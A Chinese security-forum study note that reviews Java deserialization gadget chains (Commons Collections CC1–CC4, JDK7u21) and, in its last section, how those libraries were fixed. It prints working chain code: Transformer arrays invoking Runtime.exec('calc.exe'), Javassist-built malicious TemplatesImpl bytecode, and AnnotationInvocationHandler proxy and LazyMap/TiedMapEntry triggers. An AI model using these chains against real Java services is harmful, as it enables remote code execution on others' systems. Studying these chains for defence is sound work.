0x00 前置
=======

![SummaryOfJavaDeserializations.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-b3be36a379442e3313c86b0d429ac00fbeaa9a42.png)

对学过去的几条 Java 反序列化链进行了一下梳理，梳理的结果可以看上面的图，图是用 deaw.io 画的。

- 在我的认识中，一个 Java 反序列化漏洞的出发点应该是能够使我们执行命令的地方，注意，不是执行命令的方式，是我们进入到执行命令的方式之前的那个入口，单独拿出来的话会发现他们非常的相似。
- 第二重用的则是我们从反序列化的入口到进入执行命令的位置的这个路径，这一段路径的挖掘在我看来就是我们反序列化最大的难点所在。
- 再次就是我们执行命令的方法了，这里也会有一些变化。
- 还有就是反序列化的入口，这里也有讲究。

这里为了方便进行总结，打算给他们起个名字，和上面对应。

- 枪口
- 弹膛
- 子弹
- 扳机

名字嘛，瞎起的。

当然这里只是根据我现在所学的几条简单的利用链进行的简单的总结，后续一定会有令我大开眼界的利用链的出现，到时候再更正自己的认知就好了。

我们依次来看一下，也算是对自己这段时间的所学的一个复习了。

0x01 子弹
=======

本来想先从我们上面所说的 枪口 说起，但是发现 枪口 怎么样都是绕不开这里的 子弹 的，所以还是从子弹开始说起吧。

别看有这么多的利用链，实际上 子弹 在我看来只有两种，transformer 和 TemplatesImpl 动态加载字节码文件。

tansformer
----------

transformer 是 CommonsCollection 组件的

> **转换装饰器** - 转换装饰器(`Transforming Decorators`)可以在集合添加到集合时改变集合的每个对象。

提供给我们的，我们的 CC 链的起源都是这里 。

在 org.apache.Commons.Collections.functors 这个包内存在着一系列的 Transformer 类

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-5fb3c7df34f24ef4c65dbcbf4d2a378b0509cbcd.png)

我们的 子弹 用到过的也很多：

- ChainedTransformer
- ConstantTransformer
- InvokerTransformer
- InstantiateTransformer

它们往往都是搭配使用的：

```java
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc.exe"}),
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
```

我们用到的都是他们的 transforme 方法，因为我们利用的往往都是 CommonsCollections 组件中对 transformer 内 transform 方法的调用，这里我们在 枪口 会说到，我们现在先来对这几个 transformer 进行回顾，最后再总结用法。

### InvokerTransformer

我们从 InvokerTransformer 看起，我们通常用 InvokeTransformer 来调用。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-cf46c898748b5d3a389259397508e2abcb2af5a5.png)

InvokeTransformer 的 transform 方法内存在着一个 try 结构体，里面是一串反射调用的代码，整个的过程实际上就是根据这里 InvokerTransformer 传入的参数来调用 input 类的一个方法。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-c8e337b80ad5f6293b40049422adb5db87acb3af.png)

它有三个参数，前两个在 getMethod 中有用到，最后一个则是 invoke 的最后一个参数。

这里涉及到我们反射的基础知识了，`Method getMethod(String name,Class...parameterTypes)` 参数 name 就是方法，或者说函数的名称，parameterTypes 是 method 的参数类型的列表，`Object invoke(Object obj,Object...args)`，参数 obj 是实例化后的对象，args 为用于方法调用的参数。

也就是说，我们的 InvokeTransformer 的参数中：

1. 第一个是我们 getMethod 要获取的方法
2. 第二个是我们要获取的方法的参数类型
3. 第三个参数是我们获取到的方法再调用的时候的参数

### ConstantTransformer

这个 Transformer 的 transform 方法非常简单，就是返回它的一个参数，也是它唯一的一个参数，Object 类型，是一个对象。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-86130a277f638267c2b67a79f933097eac46da0d.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-a3039d3fa00c63ca31c8b66430c6fe4fd85938fa.png)

这里我们通常会搭配 InvokeTransformer 和 ChainedTransformer 来使用。

### ChainedTransformer

ChainedTransformer 有一个参数，是一个叫 iTransformers 的 transformer 数组，而它的 transform 方法 则是利用 for 循环依次调用这个 iTransformers 中的 transform 方法，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-a5af2cafa5fdca06c26b3c5e956fbf7e487da00d.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-f1e2c58eb13e7258c03fed52ab3215a507266658.png)

理解起来可以看 P 牛画的图

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-d44fae943a95ffdcdb5925ea39819929712c3900.png)

### InstantiateTransformer

InstantiateTransformer 有两个参数，iParamTypes 和 iArgs ，它的 transform 方法在 input 非空的时候会进入到 else 中，这里和 ChainedTransformer ，ConstantTransformer 一起使用可以调用一个任类的 **构造方法**

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-45aede283ca5f57ecb60bfb73ab1997fafdb3be6.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-ca7ad12742e0a1976df138aee54e341f127f0d49.png)

这里通常会和 TrAXFilter 的构造方法 配合使用

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-9022b5b055936c805870e890d6995212ad7dbe15.png)

我们首先会调用我们的 input 的 getConstructor 方法，getConstructor 和 `getMethod` 类似， `getConstructor` 接收的参数还是有构造函数列表类型，因为 **构造函数也支持重载**，所以必须用参数列表类型 `parameterTypes` 才能唯一确定一个 **构造函数** `public Constructor<T> getConstructor(Class<?>... parameterTypes)`

在上面的利用中，我们传入了 `parameterTypes` 为 Templates.class，进而确定了我们需要的构造函数，而下面的 `Constructor.newInstance()` 可以根据传入的参数，调用任意构造构造函数。

TemplatesImpl
-------------

TemplatesImpl 动态加载字节码更详细的解析直接去看之前的文章吧，这里我们能够利用的切入点就是下面两个方法，因为只有这两个方法是 public 属性的。

```java
TemplatesImpl#getOutputProperties()
TemplatesImpl#newTransformer()
```

代码的具体内容实际上不用过多关注，大体一看就好了， TemplatesImpl 这一串只要从这两个节点其中之一进入就可以了。

关于恶意 TemplatesImpl 的创建，我在有 Javassist 的情况下将他简化为了这样的一段代码：

```java
    public static class StubTransletPayload extends AbstractTranslet {
        public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException {}
        public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
```

但是实际上真正使 TemplatesImpl 有了自己的生命力的还是结合 InstantiateTransformer 与 TrAXFilter 初始化的调用方法，这里可以帮助我们对 InvokerTransformer 进行绕过，也可以实现 Shiro 场景下的一些需要。

```java
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath((new ClassClassPath(StubTransletPayload.class)));
        CtClass clazz = pool.get(StubTransletPayload.class.getName());
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        clazz.setName("sp4c1ous");

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][] { clazz.toBytecode() });
        setFieldValue(templates, "_name", "HelloTemplatesTmpl");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
```

### getOutputProperties

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-44f90d0ea001d78664c2046041e67ba6f2d5fc98.png)

这里我们需要注意的是这里是 get 开头的。

### newTransformer

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-781b954e4c56c8c9c03b2b7e3ccaae4193aa7b2a.png)

这里代码中的内容实际上也不用关注，我们只需要记得这里的这个方法就可以了，我们可以结合 Transformer 来对它进行调用。

```java
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(obj),
                new InvokerTransformer("newTransformer",null,null)
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
```

但是实际上真正使 TemplatesImpl 有了自己的生命力的还是结合 InstantiateTransformer 与 TrAXFilter 初始化的调用方法，这里可以帮助我们对 InvokerTransformer 进行绕过，也可以实现 Shiro 场景下的一些需要。

```java
    Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
        };

        ChainedTransformer transformerChain = new ChainedTransformer(transformers);
```

弹夹
--

### 子弹1

```java
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc.exe"}),
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
```

### 子弹2

```java
    public static class StubTransletPayload extends AbstractTranslet {
        public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException {}
        public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
```

extends AbstractTranslet 的 StubTransletPayload 是我们生成 Templates 必备的一个类，setFieldValue，也是我们在创建 templates 时用到的方法，加上下面的代码我们可以创建一个恶意的 templates

```java
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath((new ClassClassPath(StubTransletPayload.class)));
        CtClass clazz = pool.get(StubTransletPayload.class.getName());
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        clazz.setName("sp4c1ous");

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][] { clazz.toBytecode() });
        setFieldValue(templates, "_name", "HelloTemplatesTmpl");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
```

### 子弹2.1

```java
    Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer",null,null)
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
```

### 子弹2.2

```java
    Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
        };

        ChainedTransformer transformerChain = new ChainedTransformer(transformers);
```

这里我把 TrAXFilter 触发 templates 动态加载字节码 和 直接使用 transformer 调用 templates 作为了子弹，但是却没有将其他一些调用 templates 的方法作为子弹，因为这里的两种实现 templates 动态加载字节码的方法是我们这里缩写的 两种被归为 子弹 的利用方式的套用，如果仅仅把 templates 视作子弹再在弹膛反复提及用 transformer 调用 templates 会很奇怪。

0x02 枪口
=======

枪口 是我认为一个反序列化漏洞最终要的地方，就像我们学 PHP 的时候审计 CMS，先用 seay 扫一遍危险函数，这些危险函数才是我们审计时候的重点，我们想方设法地让程序运行到它、利用它，在 Java 反序列化中我看到了一样的感觉，所以我认为在 Java 反序列化中最重要的是这个切入点。

因为我们的攻击方式实际上是很局限的，可以看到我们的子弹大差不差，我们的 子弹 要被利用需要的实际上都是相似的。

到现在为止，我们遇到的基本上 枪口 基本上可以归纳为 transform 的调用和 invoke 的调用两类

transform
---------

LazyMap 的 get 方法中的 transform 方法的调用

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-baad8063fe2e58494290ed3915a60eccc5f12bc5.png)

TransformingComparator 的 compare 方法中的 transform 方法的调用

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-074f015cf281482dd86e58d385704a3163690861.png)

invoke
------

ToStringBean 的 toString(String prefix) 方法中的 invoke 方法的调用

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-40632c6acb9e2e18bbd1b0f02bd629c3989f3e52.png)

EqualsBean 的 beanEquals 方法中的 invoke 方法的调用

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-621f5b5757f980f67425ff9c6f968dc29b4f1dbf.png)

PropertyUtilsBean 的 invokeMethod 中的 invoke 方法的调用（这个实际上可以归结为 JavaBean 下的 PropertyUtils.getProperty ）

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-6eac0f9de032b65cb369f04478a0bba7eca04521.png)

AnnotationInvocationHandler 的 equalsImpl 方法，我们可以通过代理到达这里

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-da9e39b05598cca4bc51484fcdf37aa5656080d9.png)

0x03 弹膛
=======

这一个部分我们真的是没有办法来细数了，细数的话就和将所有的链子从头到尾再盘一遍没什么区别了。这里提一些我觉得比较有意思的。

调用到 LazyMap 的 get
-----------------

### AnnotationInvocationHandler.Invoke 动态代理

AnnotationInvocationHandler 的 invoke 方法，结合动态代理我们可以进入到 InvocationHandler 的 invoke，进而调用 任意 map 的 get 方法，在代理的时候传入即可

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-2e9a2323c0ac4f71ea1289099089626cc5916a0d.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-e8d58d139d04f780401f090d986e125db3480171.png)

```java
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);

        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);
        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);
```

### TiedMapEntry.getValue

在 TiedMapEntry 的 getValue 方法中也存在对任意 map 的 get 方法的调用

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-1d1e6b26b502a1783aa34f535e31551f2c01dd82.png)

#### hash 调用链

getValue 方法我们可以通过 hash 调用链到达，通过 HashMap 的 hash 函数得到任意的 hashCode 方法的调用，这里的 k 就是我们传入的 key，我们通过 put 传入，进入到 TiedMapEntry 的 hashCode 后我们就可以调用到 getValue 方法了。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-2c7f21d30eef2c413238ae8a35001117ef2f3179.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-f7c2729675330d6fe06bd97a9ffec4830500f4b0.png)

```java
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry tme = new TiedMapEntry(outerMap, "123");

        Map expMap = new HashMap();
        expMap.put(tme, "whaomi");

        outerMap.remove("123");
```

#### toString 调用链

在 TiedMapEntry 的 toString 方法中也存在自身 getValue 方法的调用

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-a11c51ef23abb890cdefaae81bc7f89e720c378c.png)

BadAttributeValueExpException 的 readObject 方法中存在对可控类的 toString 方法的调用

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-e62dc67550c526118340944c965b279d20bd79cf.png)

这也是最短的一条 toString 调用链，而且位于 jdk 的原生类中，兼容性强，非常好用。

### equals 调用链

在 AbstractMap 的 equals 方法中也存在 对 get 方法的调用

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-9e28b1db45a9096ba3b9776ad108c10f75afe714.png)

我们往往会通过一连串的 equals 的调用来到达 equals 方法的目的地

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-ec4598180024fa4d5ca599a7a2e58dd2f5e6b42c.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-33ee5565d2ebb330327cb45f58309910f02ba233.png)

不过 equals 方法的使用中通常会伴随一系列的 hash 碰撞等操作，会有一些其他的 tricks 。

动态代理
----

我们的调用链中经常会有 代理 的出现，这个时候一般是由于我们用到了某个 InvocationHandler 的 invoke 方法。

比如我们的 AnnotationInvocationHandler 中有很多有用的方法、调用，同时，它本身还是一个 InvocationHandler 的实现，我们的好几条利用链都会以调用它的 invoke 为目的进行代理的设置。

JDK 原生动态代理的执行流程分为如下三步.

1. 通过实现 java.lang.reflect.InvocationHandler **接口** 来创建自定义的调用处理器( InvocationHandler )
2. 为 java.lang.reflect.Proxy 类指定一个类加载器( ClassLoader ) , 一组接口( Interfaces ) 和 一个调用处理器( InvocationHandler )
3. 调用 java.lang.reflect.Proxy.newProxyInstance() 方法 , 分别传入类加载器 , 被代理接口 , 调用处理器 ; 创建动态代理实例对象

而我们的利用过程中，通常利用的便是 已存在的调用处理器( InvocationHandler )，然后我们在我们的 POC 中实现后两步，创建我们的动态代理的实例对象。

这里调用处理器的实例的获取 forName 然后 getDeclaredConstructor , setAccessible(true) 最后 newInstance 实例化一下，这里的参数需要注意，AnnotationInvocationHandler 对象传入的第一个参数这里必须是一个注解类，否则在构造方法中会抛异常，所以这里我们传入 Retention.class

然后因为 memberValues 的类型是 Map 所以我们传入的也应该是 Map，因为这里的这个参数就是我们代理类要传入的点。

我们的代理类设置为 Map，只要调用到 Map 或其实现内存在的方法的时候，我们就可以拦截到它，进而进入处理器的 invoke 方法

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-70403560cbaa384d2b76cae9bfbe429047fe96a6.png)

```java
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, lazyMap);

    Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);
```

然后我们的代理的构造就到这里结束了，后续的利用里我们还需要考虑在什么位置将我们的代理类传入

### 利用位置1

在利用 invoke 进入 LazyMap.get 的利用链里，我们直接又套了一层 InvocationHandler ，利用 AnnotationInvocationHandler 作为入口

```java
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, lazyMap);

        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);
        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);
```

作为 AnnotationInvocationHandler 的 memberValues 参数

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-9cfbb90145ef458d57057f2dbd1cb2a11d1b8f81.png)

然后我们的 Map 代理类就会在 entrySet 的这一处调用里实现代理的拦截，进入我们设置好的调用处理器的 invoke 方法

### 利用位置

这里是 JDK7u21 中的代理的设置，最后调用到的是 equals 方法，Object 类中存在 equals 方法，所以我们这里解决兼容问题就好了，这里将 proxy 转化为了 templates 类型

```java
        Constructor handlerConstructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
        handlerConstructor.setAccessible(true);
        InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);

        // 为tempHandler创造一层代理
        Templates proxy = (Templates) Proxy.newProxyInstance(JDK7u21.class.getClassLoader(), new Class[]{Templates.class}, tempHandler);
```

但是因为我发现了之类的 equals 方法实际上是来自于 Object.class 的，所以我想了一下，这里好像不用是 Templates 类型才对

```java
        Constructor handlerConstructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
        handlerConstructor.setAccessible(true);
        InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);

        // 为tempHandler创造一层代理
        Map proxy = (Map) Proxy.newProxyInstance(JDK7u21.class.getClassLoader(), new Class[]{Map.class}, tempHandler);
```

但是 AnnotationInvocationHandler 的 memberValues 参数必须要是 Templates.class ，因为这里和我们后续的利用是相关的，但是这里我很不理解，为什么这个时候就不用考虑不是注解类报错的事情了？

版本！

这是上面 CC1 版本的构造方法

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-243fdedf31464c1edae6dbe2150f191499d05065.png)

这是我们 7u21 的构造方法

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-f64c9deb873c38ce731b4b3ee452440ae3755342.png)

这里属于是我对 7u21 修复的认识不到位了。亡羊补牢，在这篇文章的最后加一个修复模块吧。

0x04 扳机
=======

这就没什么好说的了，就是顺着链子往上找的过程，但是这里还是存在一些问题的，我们为什么就找到了这个入口呢？用别的入口可不可以？

我们利用的所有类都要实现了 serialize 接口，这里的“利用”，指的是我们在 POC 中进行了实例化操作然后设置了参数、属性等，而我们在调用链中用到的并不必须要实现实例化。

不过我们的入口肯定是要实现 Serialize 接口的，因为它一定会被我们实例化并进行参数设置。

> 插句题外话：在总结的过程中，我发现我对参数以及类型的认识有所不足，呆板的链条的审计与调试是远远不够的。这里也给我以后的学习提一个醒。

然后，这里的入口或者它的延申，一定要可以和相应的位置链接到一起，也就是我们的 枪口 和 子弹，而 弹膛 实际上是可以进行一定的调整的。

所以只要我们找的合适，用别的入口也是可以的。

0x05 修复
=======

Commons Collections
-------------------

这里我去看了一下版本的更新，可以看到两个版本的 Commons Collections 组件的修复实际上都在 2015 年，因为 CVE 就是在 2015 年爆出来的

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-fe013ec56afc02e8bcbf62b7292f75c588cd13fb.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-7154040b0a36fd105c6f72407d84ba3faf6431d4.png)

回到我们的问题，PriorityQueue 的利用链实际上是不能在 CC3 版本下使用的，因为在 Commons Collections 4.0 之前是没有实现 Serialize 接口的，所以我们的 CC2 与 CC4 利用链无法在其中使用

Commons Collections 3.1

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-688a21a23047f780de6da957f63ce3512608c4ad.png)

Commons Collections 4.0

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-64e6965a589f4e88693c3bd82c000459ade9e6ec.png)

而在之后得版本中也不能再利用的原因也是因为这个 Serializable 接口，4.1版本下 InvokerTransformer 和 InstantiateTransformer 两个类都没有实现Serializable接口，所以我们的利用 Transformer 的反序列化攻击也就失效了。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-3356aab2725c17e5cc3626428301f69fcebfd9e9.png)

### 3.2.2

3.2.2 版本并没有完全取消反序列化接口，这里采用的是另一种修复方案。

这里扩展一下 3.2.2 版本的修复方案，在 3.2.2 版本中，我们可以发现新增了一个方法

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-91ba7365dcf2d1bb569f7da67b7d886391f73e82.png)

这个方法被大量的运用到了 Transformer 以及一些其他实现 Serialize 接口的类的 writeObject &amp; readObject 中

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-9a7a059bcd4a963f545b5e4e4a39a9caef105ef7.png)

如果开发者没有设置全局配置 org.apache.commons.collections.enableUnsafeSerialization=true，这个配置用来检测反序列化是否安全，如果开发者没有配置，在默认情况下就会抛出异常

JDK7u21
-------

Java的版本是多个分支同时开发的，并不意味着JDK7的所有东西都一定比JDK6新，所以，当看到这个利用链适配7u21的时候，我们不能先入为主地认为JDK6一定都受影响。

Oracle JDK6一共发布了30多个公开的版本，最后一个公开版本是6u45，在2013年发布。此后，Oracle 公司就不再发布免费的更新了，但是付费用户仍然可以获得Java 6的更新，最新的Java 6版本是6u221。

其中，公开版本的最新版6u45仍然存在这条利用链，大概是6u51的时候修复了这个漏洞，但是这个结论不能肯定，因为免费用户下载不到这个版本。

JDK8在发布时，JDK7已经修复了这个问题，所以JDK8全版本都不受影响。

我们来看看官方在JDK7u25中是怎样修复这个问题的：<https://github.com/openjdk/jdk7u/commit/b3dd6104b67d2a03b94a4a061f7a473bb0d2dc4e>

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-21e832d0d76b7adf5bae1d7252a794cd3131f0cd.png)

我在上面总结的时候实际上也遇到了，就是注释类的那个问题。